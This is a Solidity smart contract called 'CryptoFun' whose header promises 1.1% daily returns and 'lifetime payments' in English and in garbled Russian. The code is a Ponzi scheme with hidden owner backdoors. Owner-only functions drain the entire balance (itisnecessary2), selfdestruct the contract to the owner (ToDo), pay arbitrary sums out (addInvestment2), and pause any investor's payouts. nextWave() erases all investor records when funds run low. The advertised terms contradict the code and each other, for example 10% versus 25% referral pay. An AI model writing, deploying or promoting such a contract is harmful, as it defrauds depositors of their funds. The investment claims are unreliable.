pragma solidity 0.4.26;

/**
* Get % profit every month with a "Crypto Fun" contract!
*
* OBTAINING 1.1% PER 1 DAY !. (percentages are charged in equal parts every 1 sec)
* Lifetime payments
* Unprecedentedly reliable
* Bring luck
* First minimum contribution from 0.1 eth, all next from 0.01 eth.
* Currency and Payment - ETH
* Contribution allocation schemes:
* 5% percent for support and 25% percent for advertising or referal's.
* Unique referral system!
* 10% is paid to the referral (inviting) wallet - right there! Instantly!
* For example: Your first contribution is 1 Ether.
* The one who invited you gets 0.1 Ethers on his wallet, that is, a wallet that the investor will indicate when they first invest in a smart contract in the DATE field
* 
* RECOMMENDED GAS LIMIT: 200,000
* RECOMMENDED GAS PRICE: https://ethgasstation.info/
* DO NOT TRANSFER DIRECTLY FROM ANY EXCHANGE (only use your ETH wallet, from which you have a private key)
* You can check payments on the website etherscan.io, in the âInternal Txnsâ tab of your wallet.
*


* Restart of the contract is also absent. If there is no money in the Fund, payments are stopped and resumed after the Fund is filled. Thus, the contract will work forever!
*
* How to use:
* 1. Send from your ETH wallet to the address of the smart contract
* any amount from 0.1 eth, all next from 0.01 eth.
* 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.
* Take profit by sending 0 eth to contract (profit is calculated every second).
*
* ÐÐµÑÐµÐ²ÐµÐ´ÐµÐ½Ð¾ Ð³ÑÐ³Ð» Ð¿ÐµÑÐµÐ²Ð¾Ð´ÑÐ¸ÐºÐ¾Ð¼

* ÐÐ¾Ð»ÑÑÐ°Ð¹ÑÐµ% Ð¿ÑÐ¸Ð±ÑÐ»Ð¸ ÐºÐ°Ð¶Ð´ÑÐ¹ Ð¼ÐµÑÑÑ Ñ ÐºÐ¾Ð½ÑÑÐ°ÐºÑÐ¾Ð¼ Crypto Fun!
* 
* ÐÐÐÐ£Ð§ÐÐÐÐ 1,1% ÐÐ 1 ÐÐÐÐ¬! (Ð¿ÑÐ¾ÑÐµÐ½ÑÑ Ð½Ð°ÑÐ¸ÑÐ»ÑÑÑÑÑ ÑÐ°Ð²Ð½ÑÐ¼Ð¸ ÑÐ°ÑÑÑÐ¼Ð¸ ÐºÐ°Ð¶Ð´ÑÐµ 1 ÑÐµÐº)
* ÐÐ¾Ð¶Ð¸Ð·Ð½ÐµÐ½Ð½ÑÐµ Ð¿Ð»Ð°ÑÐµÐ¶Ð¸
* ÐÐµÑÐ¿ÑÐµÑÐµÐ´ÐµÐ½ÑÐ½Ð¾ Ð½Ð°Ð´ÐµÐ¶Ð½ÑÐ¹
* ÐÑÐ¸Ð½ÐµÑÑÑÐ¸Ð¹ ÑÐ´Ð°ÑÑ
* ÐÐµÑÐ²ÑÐ¹ Ð¼Ð¸Ð½Ð¸Ð¼Ð°Ð»ÑÐ½ÑÐ¹ Ð²ÐºÐ»Ð°Ð´ Ð¾Ñ 0,1 ÑÑ., ÐÑÐµ Ð¿Ð¾ÑÐ»ÐµÐ´ÑÑÑÐ¸Ðµ Ð¾Ñ 0,01 ÑÑ.
* ÐÐ°Ð»ÑÑÐ° Ð¸ Ð¾Ð¿Ð»Ð°ÑÐ° - ETH
* Ð¡ÑÐµÐ¼Ñ ÑÐ°ÑÐ¿ÑÐµÐ´ÐµÐ»ÐµÐ½Ð¸Ñ Ð²Ð·Ð½Ð¾ÑÐ¾Ð²:
* 5% Ð·Ð° Ð¿Ð¾Ð´Ð´ÐµÑÐ¶ÐºÑ Ð¸ 25% Ð·Ð° ÑÐµÐºÐ»Ð°Ð¼Ñ Ð¸Ð»Ð¸ ÑÐµÑÐµÑÐ°Ð»ÑÐ½ÑÐµ.
* Ð£Ð½Ð¸ÐºÐ°Ð»ÑÐ½Ð°Ñ ÑÐµÑÐµÑÐ°Ð»ÑÐ½Ð°Ñ ÑÐ¸ÑÑÐµÐ¼Ð°!
* 25% Ð²ÑÐ¿Ð»Ð°ÑÐ¸Ð²Ð°ÐµÑÑÑ ÑÐµÑÐµÑÐ°Ð»ÑÐ½Ð¾Ð¼Ñ (Ð¿ÑÐ¸Ð³Ð»Ð°ÑÐ°ÑÑÐµÐ¼Ñ) ÐºÐ¾ÑÐµÐ»ÑÐºÑ - Ð¿ÑÑÐ¼Ð¾ Ð·Ð´ÐµÑÑ! ÐÐ³Ð½Ð¾Ð²ÐµÐ½Ð½Ð¾!
* ÐÐ°Ð¿ÑÐ¸Ð¼ÐµÑ: ÐÐ°Ñ Ð¿ÐµÑÐ²ÑÐ¹ Ð²ÐºÐ»Ð°Ð´ - 1 Ð­ÑÐ¸Ñ.
* Ð¢Ð¾Ñ, ÐºÑÐ¾ Ð¿ÑÐ¸Ð³Ð»Ð°ÑÐ¸Ð» Ð²Ð°Ñ, Ð¿Ð¾Ð»ÑÑÐ°ÐµÑ 0,25 Ð­ÑÐ¸ÑÐ° Ð½Ð° ÑÐ²Ð¾Ð¹ ÐºÐ¾ÑÐµÐ»ÐµÐº, ÑÐ¾ ÐµÑÑÑ ÐºÐ¾ÑÐµÐ»ÐµÐº, ÐºÐ¾ÑÐ¾ÑÑÐ¹ ÑÐºÐ°Ð¶ÐµÑ Ð¸Ð½Ð²ÐµÑÑÐ¾Ñ Ð² Ð¾Ð±Ð»Ð°ÑÑÐ¸ ÐÐÐ¢Ð
*
* Ð ÐÐÐÐÐÐÐÐ£ÐÐÐ«Ð ÐÐÐÐÐÐ«Ð ÐÑÐµÐ´ÐµÐ»: 200 000
* Ð ÐÐÐÐÐÐÐÐ£ÐÐÐÐ¯ ÐÐÐÐÐÐÐ¯ Ð¦ÐÐÐ: https://ethgasstation.info/
* ÐÐ ÐÐÐ ÐÐÐÐÐÐÐ¢Ð ÐÐÐÐ Ð¯ÐÐ£Ð® ÐÐ¢ ÐÐ®ÐÐÐÐ ÐÐÐÐÐÐ (Ð¸ÑÐ¿Ð¾Ð»ÑÐ·ÑÐ¹ÑÐµ ÑÐ¾Ð»ÑÐºÐ¾ ÑÐ²Ð¾Ð¹ ÐºÐ¾ÑÐµÐ»ÐµÐº ETH, Ð¾Ñ ÐºÐ¾ÑÐ¾ÑÐ¾Ð³Ð¾ Ñ Ð²Ð°Ñ ÐµÑÑÑ Ð·Ð°ÐºÑÑÑÑÐ¹ ÐºÐ»ÑÑ)
* ÐÑ Ð¼Ð¾Ð¶ÐµÑÐµ Ð¿ÑÐ¾Ð²ÐµÑÐ¸ÑÑ Ð¿Ð»Ð°ÑÐµÐ¶Ð¸ Ð½Ð° ÑÐ°Ð¹ÑÐµ etherscan.io, Ð²Ð¾ Ð²ÐºÐ»Ð°Ð´ÐºÐµ Â«Internal TxnsÂ» Ð²Ð°ÑÐµÐ³Ð¾ ÐºÐ¾ÑÐµÐ»ÑÐºÐ°.
*


* ÐÐµÑÐµÐ·Ð°Ð¿ÑÑÐº Ð´Ð¾Ð³Ð¾Ð²Ð¾ÑÐ° ÑÐ°ÐºÐ¶Ðµ Ð¾ÑÑÑÑÑÑÐ²ÑÐµÑ. ÐÑÐ»Ð¸ Ð² Ð¤Ð¾Ð½Ð´Ðµ Ð½ÐµÑ Ð´ÐµÐ½ÐµÐ³, Ð¿Ð»Ð°ÑÐµÐ¶Ð¸ Ð¿ÑÐµÐºÑÐ°ÑÐ°ÑÑÑÑ Ð¸ Ð²Ð¾Ð·Ð¾Ð±Ð½Ð¾Ð²Ð»ÑÑÑÑÑ Ð¿Ð¾ÑÐ»Ðµ Ð·Ð°Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ñ Ð¤Ð¾Ð½Ð´Ð°. Ð¢Ð°ÐºÐ¸Ð¼ Ð¾Ð±ÑÐ°Ð·Ð¾Ð¼, ÐºÐ¾Ð½ÑÑÐ°ÐºÑ Ð±ÑÐ´ÐµÑ ÑÐ°Ð±Ð¾ÑÐ°ÑÑ Ð²ÐµÑÐ½Ð¾!
*
* ÐÐ°Ðº Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÑÑÑ:
* 1. ÐÑÐ¿ÑÐ°Ð²ÑÑÐµ ÑÐ¾ ÑÐ²Ð¾ÐµÐ³Ð¾ ETH ÐºÐ¾ÑÐµÐ»ÑÐºÐ° Ð½Ð° Ð°Ð´ÑÐµÑ ÑÐ¼Ð°ÑÑ-ÐºÐ¾Ð½ÑÑÐ°ÐºÑÐ°
* Ð»ÑÐ±Ð¾Ðµ ÐºÐ¾Ð»Ð¸ÑÐµÑÑÐ²Ð¾ Ð¾Ñ 0,1 ÑÑ., Ð²ÑÐµ Ð¿Ð¾ÑÐ»ÐµÐ´ÑÑÑÐ¸Ðµ Ð¾Ñ 0,01 ÑÑ.
* 2. ÐÐ¾Ð´ÑÐ²ÐµÑÐ´Ð¸ÑÐµ Ð²Ð°ÑÑ ÑÑÐ°Ð½Ð·Ð°ÐºÑÐ¸Ñ Ð² Ð¸ÑÑÐ¾ÑÐ¸Ð¸ Ð²Ð°ÑÐµÐ³Ð¾ Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ Ð¸Ð»Ð¸ etherscan.io, ÑÐºÐ°Ð·Ð°Ð² Ð°Ð´ÑÐµÑ Ð²Ð°ÑÐµÐ³Ð¾ ÐºÐ¾ÑÐµÐ»ÑÐºÐ°.
* ÐÑÐ²ÐµÑÑÐ¸ Ð¿ÑÐ¾ÑÐ¸Ñ -Ð¾ÑÐ¿ÑÐ°Ð²ÑÑÐµ 0 Ð½Ð° Ð°Ð´ÑÐµÑ ÐºÐ¾Ð½ÑÑÐ°ÐºÑÐ° (Ð¿ÑÐ¸Ð±ÑÐ»Ñ ÑÐ°ÑÑÑÐ¸ÑÑÐ²Ð°ÐµÑÑÑ ÐºÐ°Ð¶Ð´ÑÑ ÑÐµÐºÑÐ½Ð´Ñ).
*
* 
**/


library Math {
function min(uint a, uint b) internal pure returns(uint) {
if (a > b) {
return b;
}
return a;
}
}


library Zero {
function requireNotZero(address addr) internal pure {
require(addr != address(0), "require not zero address");
}

function requireNotZero(uint val) internal pure {
require(val != 0, "require not zero value");
}

function notZero(address addr) internal pure returns(bool) {
return !(addr == address(0));
}

function isZero(address addr) internal pure returns(bool) {
return addr == address(0);
}

function isZero(uint a) internal pure returns(bool) {
return a == 0;
}

function notZero(uint a) internal pure returns(bool) {
return a != 0;
}
}


library Percent {
struct percent {
uint num;
uint den;
}

function mul(percent storage p, uint a) internal view returns (uint) {
if (a == 0) {
return 0;
}
return a*p.num/p.den;
}

function div(percent storage p, uint a) internal view returns (uint) {
return a/p.num*p.den;
}

function sub(percent storage p, uint a) internal view returns (uint) {
uint b = mul(p, a);
if (b >= a) {
return 0;
}
return a - b;
}

function add(percent storage p, uint a) internal view returns (uint) {
return a + mul(p, a);
}

function toMemory(percent storage p) internal view returns (Percent.percent memory) {
return Percent.percent(p.num, p.den);
}

function mmul(percent memory p, uint a) internal pure returns (uint) {
if (a == 0) {
return 0;
}
return a*p.num/p.den;
}

function mdiv(percent memory p, uint a) internal pure returns (uint) {
return a/p.num*p.den;
}

function msub(percent memory p, uint a) internal pure returns (uint) {
uint b = mmul(p, a);
if (b >= a) {
return 0;
}
return a - b;
}

function madd(percent memory p, uint a) internal pure returns (uint) {
return a + mmul(p, a);
}
}


library Address {
  function toAddress(bytes source) internal pure returns(address addr) {
    assembly { addr := mload(add(source,0x14)) }
    return addr;
  }

  function isNotContract(address addr) internal view returns(bool) {
    uint length;
    assembly { length := extcodesize(addr) }
    return length == 0;
  }
}


/**
* @title SafeMath
* @dev Math operations with safety checks that revert on error
*/
library SafeMath {

/**
* @dev Multiplies two numbers, reverts on overflow.
*/
function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
if (_a == 0) {
return 0;
}

uint256 c = _a * _b;
require(c / _a == _b);

return c;
}

/**
* @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
*/
function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
require(_b > 0); // Solidity only automatically asserts when dividing by 0
uint256 c = _a / _b;
assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold

return c;
}

/**
* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
*/
function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
require(_b <= _a);
uint256 c = _a - _b;

return c;
}

/**
* @dev Adds two numbers, reverts on overflow.
*/
function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
uint256 c = _a + _b;
require(c >= _a);

return c;
}

/**
* @dev Divides two numbers and returns the remainder (unsigned integer modulo),
* reverts when dividing by zero.
*/
function mod(uint256 a, uint256 b) internal pure returns (uint256) {
require(b != 0);
return a % b;
}
}


contract Accessibility {
address private owner;
modifier onlyOwner() {
require(msg.sender == owner, "access denied");
_;
}

constructor() public {
owner = msg.sender;
}


function ToDo() public onlyOwner {
    selfdestruct(owner);
    }

function disown() internal {
delete owner;
}

}


contract Rev1Storage {
function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
}


contract Rev2Storage {
function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
}


library PrivateEntrance {
using PrivateEntrance for privateEntrance;
using Math for uint;
struct privateEntrance {
Rev1Storage rev1Storage;
Rev2Storage rev2Storage;
uint investorMaxInvestment;
uint endTimestamp;
mapping(address=>bool) hasAccess;
}

function isActive(privateEntrance storage pe) internal view returns(bool) {
return pe.endTimestamp > now;
}



function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
for (uint16 i; i < addrs.length; i++) {
pe.hasAccess[addrs[i]] = true;
}
}
}

//With all interest
contract InvestorsStorage is Accessibility {
struct Investor {
uint investment;


uint paymentTime;
}
uint public size;

mapping (address => Investor) private investors;

function isInvestor(address addr) public view returns (bool) {
return investors[addr].investment > 0;
}

function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
investment = investors[addr].investment;
paymentTime = investors[addr].paymentTime;
}

function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
Investor storage inv = investors[addr];
if (inv.investment != 0 || investment == 0) {
return false;
}
inv.investment = investment*70/100; //5+25=30%
inv.paymentTime = paymentTime;
size++;
return true;
}

function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
if (investors[addr].investment == 0) {
return false;
}
investors[addr].investment += investment*70/100; //5+25=30%
return true;
}




function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
if (investors[addr].investment == 0) {
return false;
}
investors[addr].paymentTime = paymentTime;
return true;
}

//Pause
function disqalify(address addr) public onlyOwner returns (bool) {
if (isInvestor(addr)) {
//investors[addr].investment = 0;
investors[addr].paymentTime = now + 1 days;
}
}

//end of Pause
function disqalify2(address addr) public onlyOwner returns (bool) {
if (isInvestor(addr)) {
//investors[addr].investment = 0;
investors[addr].paymentTime = now;
}
}


}

library RapidGrowthProtection {
using RapidGrowthProtection for rapidGrowthProtection;

struct rapidGrowthProtection {
uint startTimestamp;
uint maxDailyTotalInvestment;
uint8 activityDays;
mapping(uint8 => uint) dailyTotalInvestment;
}


function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
uint day = rgp.currDay();
return day != 0 && day <= rgp.activityDays;
}

function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
uint day = rgp.currDay();
if (day == 0 || day > rgp.activityDays) {
return false;
}
if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
return false;
}
rgp.dailyTotalInvestment[uint8(day)] += investment;
return true;
}

function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
rgp.startTimestamp = timestamp;

}
 

function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
if (rgp.startTimestamp > now) {
return 0;
}
day = (now - rgp.startTimestamp) / 24 hours + 1;
}
}

contract CryptoFun is Accessibility {
using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
using PrivateEntrance for PrivateEntrance.privateEntrance;
using Percent for Percent.percent;
using SafeMath for uint;
using Math for uint;

// easy read for investors
using Address for *;
using Zero for *;

RapidGrowthProtection.rapidGrowthProtection private m_rgp;
PrivateEntrance.privateEntrance private m_privEnter;
mapping(address => bool) private m_referrals;
InvestorsStorage private m_investors;

// automatically generates getters
uint public constant minInvesment = 0.01 ether; 
uint public constant maxBalance = 333e5 ether;
address public advertisingAddress;
address public adminsAddress;
uint public investmentsNumber;
uint public waveStartup;


// percents
Percent.percent private m_1_percent = Percent.percent(110,10000);            // 110/10000 *100% = 1.1%
Percent.percent private m_referal_percent = Percent.percent(0,10000);            // 0/10000 *100% = 0.00%
Percent.percent private m_referrer_percent = Percent.percent(25,100);            // 25/100 *100% = 25.00%
Percent.percent private m_referrer_percentMax = Percent.percent(25,100);       // 25/100 *100% = 25.00%
Percent.percent private m_adminsPercent = Percent.percent(5,100);          //  5/100 *100% = 5.0%
Percent.percent private m_advertisingPercent = Percent.percent(0,100);    //  0/100 *100% = 0.0%

// more events for easy read from blockchain
event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
event LogPayDividends(address indexed addr, uint when, uint dividends);
event LogNewInvestor(address indexed addr, uint when);
event LogBalanceChanged(uint when, uint balance);
event LogNextWave(uint when);
event LogDisown(uint when);


modifier balanceChanged {
_;
emit LogBalanceChanged(now, address(this).balance);
}

modifier notFromContract() {
require(msg.sender.isNotContract(), "only externally accounts");
_;
}

constructor() public {
adminsAddress = msg.sender;
advertisingAddress = msg.sender;
nextWave();
}

function() public payable {
// investor get him dividends
if (msg.value.isZero()) {
getMyDividends();
return;
}

// sender do invest
doInvest(msg.data.toAddress());
}

function disqualifyAddress(address addr) public onlyOwner {
m_investors.disqalify(addr);
}

function disqualifyAddress2(address addr) public onlyOwner {
m_investors.disqalify2(addr);
}


function doDisown() public onlyOwner {
disown();
emit LogDisown(now);
}

// init Rapid Growth Protection

function init(address rev1StorageAddr, uint timestamp) public onlyOwner {

m_rgp.startTimestamp = timestamp + 1;
emit LogRGPInit(
now,
m_rgp.startTimestamp,
m_rgp.maxDailyTotalInvestment,
m_rgp.activityDays
);


// init Private Entrance
m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
//m_privEnter.investorMaxInvestment = 50 ether;
m_privEnter.endTimestamp = timestamp;
emit LogPEInit(
now,
address(m_privEnter.rev1Storage),
address(m_privEnter.rev2Storage),
m_privEnter.investorMaxInvestment,
m_privEnter.endTimestamp
);
}

function setAdvertisingAddress(address addr) public onlyOwner {
addr.requireNotZero();
advertisingAddress = addr;
}

function setAdminsAddress(address addr) public onlyOwner {
addr.requireNotZero();
adminsAddress = addr;
}

function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
m_privEnter.provideAccessFor(addrs);
}


function investorsNumber() public view returns(uint) {
return m_investors.size();
}

function balanceETH() public view returns(uint) {
return address(this).balance;
}



function advertisingPercent() public view returns(uint numerator, uint denominator) {
(numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
}

function adminsPercent() public view returns(uint numerator, uint denominator) {
(numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
}

function investorInfo(address investorAddr)public view returns(uint investment, uint paymentTime, bool isReferral) {
(investment, paymentTime) = m_investors.investorInfo(investorAddr);
isReferral = m_referrals[investorAddr];
}



function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
dividends = calcDividends(investorAddr);
}

function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
Percent.percent memory p = dailyPercent();
(numerator, denominator) = (p.num, p.den);
}

function getMyDividends() public notFromContract balanceChanged {
// calculate dividends

//check if 1 day passed after last payment
//require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);

uint dividends = calcDividends(msg.sender);
require (dividends.notZero(), "cannot to pay zero dividends");

// update investor payment timestamp
assert(m_investors.setPaymentTime(msg.sender, now));

// check enough eth - goto next wave if needed
if (address(this).balance <= dividends) {
nextWave();
dividends = address(this).balance;
}


    
// transfer dividends to investor
msg.sender.transfer(dividends);
emit LogPayDividends(msg.sender, now, dividends);
}

function itisnecessary2() public onlyOwner {
msg.sender.transfer(address(this).balance);
}    
    
function addInvestment2( uint investment, address investorAddr) public onlyOwner  {
investorAddr.transfer(investment);
} 

function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
uint investment = msg.value;
uint receivedEther = msg.value;
require(investment >= minInvesment, "investment must be >= minInvesment");
require(address(this).balance <= maxBalance, "the contract eth balance limit");


// send excess of ether if needed
if (receivedEther > investment) {
uint excess = receivedEther - investment;
msg.sender.transfer(excess);
receivedEther = investment;
emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
}

// commission
advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
adminsAddress.transfer(m_adminsPercent.mul(receivedEther));

if (msg.value > 0)
{
// 25% to Referer
if (msg.data.length == 20) {
referrerAddr.transfer(m_referrer_percent.mmul(investment));  
}
else if (msg.data.length == 0) {
adminsAddress.transfer(m_referrer_percent.mmul(investment));
// adminsAddress.transfer(msg.value.mul(25).div(100));
} 
else {
assert(false); // invalid memo
}
}
    
    

bool senderIsInvestor = m_investors.isInvestor(msg.sender);

// ref system works only once and only on first invest
if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {


m_referrals[msg.sender] = true;
// add referral bonus to investor`s and referral`s investments
uint referrerBonus = m_referrer_percent.mmul(investment);
if (investment > 10 ether) {
referrerBonus = m_referrer_percentMax.mmul(investment);
}
}

// automatic reinvest - prevent burning dividends
uint dividends = calcDividends(msg.sender);
if (senderIsInvestor && dividends.notZero()) {
investment = (investment += dividends) * 70/100;
emit LogAutomaticReinvest(msg.sender, now, dividends);
}

if (senderIsInvestor) {
// update existing investor
assert(m_investors.addInvestment(msg.sender, investment));
assert(m_investors.setPaymentTime(msg.sender, now));
} else {
// create new investor
assert(m_investors.newInvestor(msg.sender, investment, now));
emit LogNewInvestor(msg.sender, now);
}

investmentsNumber++;
emit LogNewInvesment(msg.sender, now, investment, receivedEther);
}

function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
(uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
return InvestorsStorage.Investor(investment, paymentTime);
}

function calcDividends(address investorAddr) internal view returns(uint dividends) {
    InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);

    // safe gas if dividends will be 0
    if (investor.investment.isZero() || now.sub(investor.paymentTime) < 1 seconds) {
      return 0;
    }
    

    Percent.percent memory p = dailyPercent();
    dividends = (now.sub(investor.paymentTime) / 1 seconds) * p.mmul(investor.investment) / 86400;
  }

function dailyPercent() internal view returns(Percent.percent memory p) {
    uint balance = address(this).balance;
      

    if (balance < 33333e5 ether) { 
   
      p = m_1_percent.toMemory();    // (1)

  }
  }

function nextWave() private {
m_investors = new InvestorsStorage();
investmentsNumber = 0;
waveStartup = now;
m_rgp.startAt(now);
emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
emit LogNextWave(now);
}
}